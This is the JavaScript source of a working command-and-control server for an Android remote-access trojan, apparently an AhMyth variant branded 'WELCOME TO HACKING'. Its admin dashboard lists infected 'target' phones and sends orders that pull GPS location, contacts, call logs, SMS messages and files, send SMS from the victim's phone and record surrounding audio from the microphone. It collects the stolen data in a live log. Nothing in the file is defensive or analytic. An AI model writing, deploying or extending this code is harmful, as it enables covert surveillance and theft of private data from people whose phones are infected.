const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);

// Socket.IO server configuration with persistent ping/pong to prevent disconnection
const io = socketIo(server, {
    pingTimeout: 120000,   // 2 minutes
    pingInterval: 10000,   // 10 seconds heartbeat
    transports: ['websocket', 'polling']
});

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'ADMIN';
const AUTH_COOKIE = 'ahmyth_admin_auth';
const SECRET_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD + '_secret_salt').digest('hex');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// Store all registered devices (both Online and Offline)
const devicesMap = new Map();
const deviceLogs = [];

function addLog(msg, type = 'info') {
    const logItem = {
        time: new Date().toLocaleTimeString(),
        date: new Date().toLocaleDateString(),
        msg,
        type
    };
    deviceLogs.unshift(logItem);
    if (deviceLogs.length > 150) deviceLogs.pop();
    io.emit('admin_log', logItem);
}

// Authentication middleware
function requireAuth(req, res, next) {
    if (req.cookies && req.cookies[AUTH_COOKIE] === SECRET_TOKEN) {
        return next();
    }
    return res.redirect('/login');
}

// Login Page
app.get('/login', (req, res) => {
    if (req.cookies && req.cookies[AUTH_COOKIE] === SECRET_TOKEN) {
        return res.redirect('/admin');
    }
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WELCOME TO HACKING - Login</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #05050a; color: #00ff88; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .login-card { background: #0f111a; padding: 40px; border-radius: 12px; border: 1px solid #00ff88; box-shadow: 0 0 25px rgba(0, 255, 136, 0.2); width: 100%; max-width: 420px; text-align: center; }
            h2 { color: #00ff88; margin-bottom: 25px; font-size: 24px; letter-spacing: 2px; text-transform: uppercase; text-shadow: 0 0 10px rgba(0,255,136,0.5); }
            input[type="password"] { width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #00f2fe; border-radius: 6px; background: #05050a; color: #fff; font-size: 16px; outline: none; }
            input[type="password"]:focus { border-color: #00ff88; box-shadow: 0 0 10px rgba(0, 255, 136, 0.5); }
            button { width: 100%; padding: 14px; background: #00ff88; color: #05050a; font-size: 16px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; transition: 0.3s; letter-spacing: 1px; }
            button:hover { background: #00f2fe; color: #000; box-shadow: 0 0 15px rgba(0, 242, 254, 0.6); }
            .error { color: #ff4d4d; margin-bottom: 15px; font-size: 14px; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <h2>WELCOME TO HACKING</h2>
            ${req.query.error ? '<div class="error">❌ ACCESS DENIED! Wrong Password.</div>' : ''}
            <form action="/login" method="POST">
                <input type="password" name="password" placeholder="Enter Admin Password" required autofocus>
                <button type="submit">LOGIN TO DASHBOARD</button>
            </form>
        </div>
    </body>
    </html>
    `);
});

// Process Login
app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        res.cookie(AUTH_COOKIE, SECRET_TOKEN, { httpOnly: true, maxAge: 86400000 * 7 });
        return res.redirect('/admin');
    }
    res.redirect('/login?error=1');
});

// Logout
app.get('/logout', (req, res) => {
    res.clearCookie(AUTH_COOKIE);
    res.redirect('/login');
});

// Redirect root to /admin
app.get('/', (req, res) => {
    res.redirect('/admin');
});

// Refresh / Wakeup Broadcast Endpoint
app.post('/admin/refresh-wake', requireAuth, (req, res) => {
    io.emit('ping');
    addLog(`🔄 ADMIN REFRESH: Broadcasted wake-up & keep-alive ping to all devices.`);
    const selected = req.query.selected || req.body.selected || '';
    res.redirect(`/admin${selected ? '?selected=' + selected : ''}`);
});

// Admin Panel Dashboard (Protected)
app.get('/admin', requireAuth, (req, res) => {
    const selectedDeviceId = req.query.selected || '';
    let selectedDevice = null;

    let tableRowsHtml = '';
    
    if (devicesMap.size === 0) {
        tableRowsHtml = `
        <tr>
            <td colspan="6" style="text-align:center; color:#888; padding:20px;">
                No target device connected yet. Launch the APK on target phone.
            </td>
        </tr>`;
    } else {
        devicesMap.forEach((device, id) => {
            const isSelected = selectedDeviceId === id;
            if (isSelected) selectedDevice = device;

            const statusBadge = device.status === 'ONLINE' 
                ? `<span style="background:rgba(0,255,136,0.2); color:#00ff88; border:1px solid #00ff88; padding:4px 10px; border-radius:12px; font-weight:bold; font-size:12px;">ONLINE ✅</span>`
                : `<span style="background:rgba(255,77,77,0.2); color:#ff4d4d; border:1px solid #ff4d4d; padding:4px 10px; border-radius:12px; font-weight:bold; font-size:12px;">OFFLINE ❌</span>`;

            tableRowsHtml += `
            <tr style="border-bottom: 1px solid #1a2238; background: ${isSelected ? 'rgba(0, 242, 254, 0.1)' : 'transparent'};">
                <td style="padding:14px;">${device.date} ${device.time}</td>
                <td style="padding:14px;"><span style="font-size:16px;">🇮🇳</span> ${device.country || 'India'}</td>
                <td style="padding:14px;">
                    <a href="/admin?selected=${id}" style="color:#00f2fe; font-weight:bold; text-decoration:none; font-size:15px; border-bottom:1px dashed #00f2fe; padding-bottom:2px;">
                        📱 ${device.model} (${device.manf})
                    </a>
                </td>
                <td style="padding:14px; font-family:monospace; color:#aaa;">${device.ip}</td>
                <td style="padding:14px;">${statusBadge}</td>
                <td style="padding:14px; text-align:right;">
                    <form action="/admin/refresh-wake" method="POST" style="display:inline;">
                        <input type="hidden" name="selected" value="${selectedDeviceId}">
                        <button type="submit" style="background:#00f2fe; color:#000; padding:6px 14px; border-radius:6px; font-weight:bold; font-size:12px; border:none; cursor:pointer;">
                            🔄 REFRESH
                        </button>
                    </form>
                </td>
            </tr>`;
        });
    }

    // Selected Device Control Panel View
    let controlPanelView = '';
    if (selectedDevice) {
        controlPanelView = `
        <div style="background: #0d111e; border: 1px solid #00f2fe; border-radius: 12px; padding: 25px; margin-top: 30px; box-shadow: 0 0 20px rgba(0,242,254,0.15);">
            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1a2540; padding-bottom:15px; margin-bottom:20px;">
                <div>
                    <h2 style="color:#00f2fe; margin-bottom:5px;">📱 CONTROL PANEL FOR: <span style="color:#fff;">${selectedDevice.model} (${selectedDevice.manf})</span></h2>
                    <p style="color:#aaa; font-size:13px;"><strong>Device ID:</strong> ${selectedDevice.id} | <strong>Android:</strong> ${selectedDevice.release} | <strong>IP:</strong> ${selectedDevice.ip}</p>
                </div>
                <a href="/admin" style="background:#ff4d4d; color:#fff; padding:6px 12px; border-radius:6px; text-decoration:none; font-weight:bold; font-size:12px;">✖ CLOSE PANEL</a>
            </div>

            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;">
                
                <!-- Location -->
                <div style="background:#141a2e; border:1px solid #00ff88; padding:18px; border-radius:8px;">
                    <h3 style="color:#00ff88; margin-bottom:10px;">📍 Location Tracker</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:12px;">Fetch current GPS / Network location of target device.</p>
                    <form action="/admin/send-order" method="POST">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.id}">
                        <input type="hidden" name="order" value="x0000lm">
                        <button type="submit" style="width:100%; padding:10px; background:#00ff88; color:#000; font-weight:bold; border:none; border-radius:6px; cursor:pointer;">GET LOCATION</button>
                    </form>
                </div>

                <!-- Contacts -->
                <div style="background:#141a2e; border:1px solid #00f2fe; padding:18px; border-radius:8px;">
                    <h3 style="color:#00f2fe; margin-bottom:10px;">👤 Contacts Fetcher</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:12px;">Download entire phone contact list.</p>
                    <form action="/admin/send-order" method="POST">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.id}">
                        <input type="hidden" name="order" value="x0000cn">
                        <button type="submit" style="width:100%; padding:10px; background:#00f2fe; color:#000; font-weight:bold; border:none; border-radius:6px; cursor:pointer;">FETCH CONTACTS</button>
                    </form>
                </div>

                <!-- Call Logs -->
                <div style="background:#141a2e; border:1px solid #ffbb00; padding:18px; border-radius:8px;">
                    <h3 style="color:#ffbb00; margin-bottom:10px;">📞 Call Logs</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:12px;">Extract call history logs from phone.</p>
                    <form action="/admin/send-order" method="POST">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.id}">
                        <input type="hidden" name="order" value="x0000cl">
                        <button type="submit" style="width:100%; padding:10px; background:#ffbb00; color:#000; font-weight:bold; border:none; border-radius:6px; cursor:pointer;">GET CALL LOGS</button>
                    </form>
                </div>

                <!-- SMS Manager -->
                <div style="background:#141a2e; border:1px solid #ff0077; padding:18px; border-radius:8px;">
                    <h3 style="color:#ff0077; margin-bottom:10px;">💬 SMS Manager</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:10px;">Fetch SMS messages or send SMS from target phone.</p>
                    <form action="/admin/send-order" method="POST" style="margin-bottom:8px;">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.id}">
                        <input type="hidden" name="order" value="x0000sm_ls">
                        <button type="submit" style="width:100%; padding:8px; background:#ff0077; color:#fff; font-weight:bold; border:none; border-radius:6px; cursor:pointer;">FETCH SMS INBOX</button>
                    </form>
                    <form action="/admin/send-order" method="POST" style="display:flex; flex-direction:column; gap:6px;">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.id}">
                        <input type="hidden" name="order" value="x0000sm_send">
                        <input type="text" name="to" placeholder="Target Phone Number" required style="padding:6px; background:#080b14; color:#fff; border:1px solid #444; border-radius:4px;">
                        <input type="text" name="sms" placeholder="SMS Body Text" required style="padding:6px; background:#080b14; color:#fff; border:1px solid #444; border-radius:4px;">
                        <button type="submit" style="padding:8px; background:#444; color:#fff; font-weight:bold; border:none; border-radius:4px; cursor:pointer;">SEND SMS FROM PHONE</button>
                    </form>
                </div>

                <!-- File Manager -->
                <div style="background:#141a2e; border:1px solid #9900ff; padding:18px; border-radius:8px;">
                    <h3 style="color:#9900ff; margin-bottom:10px;">📁 File Manager</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:10px;">Browse storage files and directories.</p>
                    <form action="/admin/send-order" method="POST" style="display:flex; gap:6px;">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.id}">
                        <input type="hidden" name="order" value="x0000fm_ls">
                        <input type="text" name="extra" placeholder="Path (default /)" value="/" style="padding:8px; background:#080b14; color:#fff; border:1px solid #444; border-radius:4px; flex:1;">
                        <button type="submit" style="padding:8px 14px; background:#9900ff; color:#fff; font-weight:bold; border:none; border-radius:4px; cursor:pointer;">BROWSE</button>
                    </form>
                </div>

                <!-- Camera -->
                <div style="background:#141a2e; border:1px solid #00f2fe; padding:18px; border-radius:8px;">
                    <h3 style="color:#00f2fe; margin-bottom:10px;">📷 Camera Control</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:10px;">Get camera list & capture photo.</p>
                    <form action="/admin/send-order" method="POST">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.id}">
                        <input type="hidden" name="order" value="x0000ca_ls">
                        <button type="submit" style="width:100%; padding:10px; background:#00f2fe; color:#000; font-weight:bold; border:none; border-radius:6px; cursor:pointer;">GET CAMERAS</button>
                    </form>
                </div>

                <!-- Microphone -->
                <div style="background:#141a2e; border:1px solid #ff4d4d; padding:18px; border-radius:8px;">
                    <h3 style="color:#ff4d4d; margin-bottom:10px;">🎙️ Audio Recorder</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:10px;">Record live surrounding audio from mic.</p>
                    <form action="/admin/send-order" method="POST" style="display:flex; gap:6px;">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.id}">
                        <input type="hidden" name="order" value="x0000mc">
                        <input type="number" name="extra" placeholder="Seconds (e.g. 10)" value="10" style="padding:8px; background:#080b14; color:#fff; border:1px solid #444; border-radius:4px; width:100px;">
                        <button type="submit" style="padding:8px 14px; background:#ff4d4d; color:#fff; font-weight:bold; border:none; border-radius:4px; flex:1; cursor:pointer;">RECORD MIC</button>
                    </form>
                </div>

            </div>
        </div>`;
    }

    let logsHtml = deviceLogs.map(l => `<div style="margin-bottom:4px;"><span style="color:#666;">[${l.time}]</span> <span style="color:#00ff88;">${l.msg}</span></div>`).join('');

    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WELCOME TO HACKING - Admin Dashboard</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #05050a; color: #d0d0d0; padding: 25px; }
            .container { max-width: 1200px; margin: 0 auto; }
            
            /* Main Header */
            header { display: flex; justify-content: space-between; align-items: center; position: relative; padding-bottom: 20px; margin-bottom: 30px; border-bottom: 2px solid #00ff88; }
            .header-title { position: absolute; left: 50%; transform: translateX(-50%); font-size: 28px; font-weight: 900; color: #00ff88; letter-spacing: 3px; text-transform: uppercase; text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
            .logout-btn { padding: 10px 20px; background: #ff4d4d; color: #fff; text-decoration: none; font-weight: bold; border-radius: 6px; margin-left: auto; transition:0.3s; }
            .logout-btn:hover { background: #ff1a1a; box-shadow: 0 0 10px rgba(255,77,77,0.5); }
            
            /* Card Section */
            .card { background: #0d111e; border-radius: 12px; border: 1px solid #1a2540; padding: 25px; margin-bottom: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
            .card h2 { color: #00f2fe; margin-bottom: 15px; font-size: 20px; letter-spacing: 1px; }

            /* Metadata Table */
            .table-responsive { width: 100%; overflow-x: auto; }
            table { width: 100%; border-collapse: collapse; text-align: left; }
            th { background: #12182b; color: #00ff88; padding: 14px; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 2px solid #00ff88; }
            
            /* Terminal Logs */
            .logs-box { background: #000; color: #00ff88; padding: 18px; border-radius: 8px; height: 260px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 13px; border: 1px solid #1f2d4d; }
        </style>
    </head>
    <body>
        <div class="container">
            <header>
                <div style="font-size: 14px; color: #aaa;">Status: <span style="color:#00ff88; font-weight:bold;">ONLINE ✅</span></div>
                <div class="header-title">WELCOME TO HACKING</div>
                <a href="/logout" class="logout-btn">LOGOUT 🔒</a>
            </header>

            <!-- Metadata Table -->
            <div class="card">
                <h2>📲 DEVICE METADATA & CONTROL (Click Model Name to Open Features)</h2>
                <div class="table-responsive">
                    <table>
                        <thead>
                            <tr>
                                <th>DATE</th>
                                <th>COUNTRY</th>
                                <th>MODEL</th>
                                <th>IP ADDRESS</th>
                                <th>STATUS</th>
                                <th style="text-align:right;">ACTION</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${tableRowsHtml}
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Selected Device Feature View -->
            ${controlPanelView}

            <!-- Realtime Logs -->
            <div class="card" style="margin-top:30px;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                    <h2 style="margin:0;">📋 LIVE ACTIVITY LOGS</h2>
                    <form action="/admin/refresh-wake" method="POST" style="display:inline;">
                        <input type="hidden" name="selected" value="${selectedDeviceId}">
                        <button type="submit" style="background:#00f2fe; color:#000; padding:6px 12px; border-radius:6px; font-weight:bold; font-size:12px; border:none; cursor:pointer;">🔄 REFRESH ALL</button>
                    </form>
                </div>
                <div class="logs-box" id="logsBox">
                    ${logsHtml || '<div>Waiting for incoming target device activity...</div>'}
                </div>
            </div>
        </div>
    </body>
    </html>
    `);
});

// Admin order handler
app.post('/admin/send-order', requireAuth, (req, res) => {
    const { socketId, selected, order, extra, to, sms } = req.body;
    
    // Find target socket
    let socket = null;
    if (socketId && io.sockets.connected) {
        socket = io.sockets.connected[socketId] || io.sockets.sockets[socketId];
    }
    
    if (!socket) {
        // Fallback: search by device ID in devicesMap
        for (let [sId, dev] of devicesMap.entries()) {
            if (dev.id === selected && dev.status === 'ONLINE') {
                socket = io.sockets.connected ? io.sockets.connected[dev.socketId] : io.sockets.sockets[dev.socketId];
                break;
            }
        }
    }

    if (!socket) {
        addLog(`❌ Action Failed: Target device is offline or socket disconnected. Press REFRESH button to wake up target.`, 'error');
        return res.redirect(`/admin${selected ? '?selected=' + selected : ''}`);
    }

    let payload = {};
    if (order === 'x0000lm') {
        payload = { order: 'x0000lm' };
    } else if (order === 'x0000cn') {
        payload = { order: 'x0000cn' };
    } else if (order === 'x0000cl') {
        payload = { order: 'x0000cl' };
    } else if (order === 'x0000sm_ls') {
        payload = { order: 'x0000sm', extra: 'ls' };
    } else if (order === 'x0000sm_send') {
        payload = { order: 'x0000sm', extra: 'sendSMS', to: to, sms: sms };
    } else if (order === 'x0000fm_ls') {
        payload = { order: 'x0000fm', extra: 'ls', path: extra || '/' };
    } else if (order === 'x0000ca_ls') {
        payload = { order: 'x0000ca', extra: 'camList' };
    } else if (order === 'x0000mc') {
        payload = { order: 'x0000mc', sec: parseInt(extra) || 10 };
    } else {
        payload = { order: order, extra: extra };
    }

    socket.emit('order', payload);
    addLog(`➡️ Command Sent to Target: ${JSON.stringify(payload)}`);
    res.redirect(`/admin${selected ? '?selected=' + selected : ''}`);
});

// Socket.IO Connection Handler for Target Phone APK
io.on('connection', (socket) => {
    const handshake = socket.handshake;
    const query = handshake.query || {};
    const clientIp = handshake.headers['x-forwarded-for'] || handshake.address;

    const deviceId = query.id || socket.id;
    const deviceObj = {
        socketId: socket.id,
        id: deviceId,
        model: query.model || 'Android Phone',
        manf: query.manf || 'Generic',
        release: query.release || 'Android OS',
        ip: clientIp,
        country: 'India',
        date: new Date().toLocaleDateString(),
        time: new Date().toLocaleTimeString(),
        status: 'ONLINE'
    };

    devicesMap.set(deviceId, deviceObj);
    addLog(`📱 Target Connected! Model: ${deviceObj.model} (${deviceObj.manf}), IP: ${clientIp}`);

    // Periodic ping/pong keep alive
    socket.on('ping', () => {
        socket.emit('pong');
    });

    // Received data events from APK
    socket.on('x0000sm', (data) => addLog(`📥 SMS Received: ${JSON.stringify(data)}`));
    socket.on('x0000cl', (data) => addLog(`📥 Call Logs Received: ${JSON.stringify(data)}`));
    socket.on('x0000cn', (data) => addLog(`📥 Contacts Received: ${JSON.stringify(data)}`));
    socket.on('x0000lm', (data) => addLog(`📥 Location Data Received: ${JSON.stringify(data)}`));
    socket.on('x0000fm', (data) => addLog(`📥 File Manager Received: ${JSON.stringify(data)}`));
    socket.on('x0000ca', (data) => addLog(`📥 Camera Data Received: ${JSON.stringify(data)}`));
    socket.on('x0000mc', (data) => addLog(`📥 Mic Audio Received`));

    socket.on('disconnect', () => {
        addLog(`🔌 Device Disconnected: ${deviceObj.model}`);
        if (devicesMap.has(deviceId)) {
            devicesMap.get(deviceId).status = 'OFFLINE';
        }
    });
});

const PORT = process.env.PORT || 40474;
server.listen(PORT, () => {
    console.log(`[🚀] WELCOME TO HACKING Server running on port ${PORT}`);
    console.log(`[🔒] Admin Panel URL: http://localhost:${PORT}/admin (Password: ${ADMIN_PASSWORD})`);
});
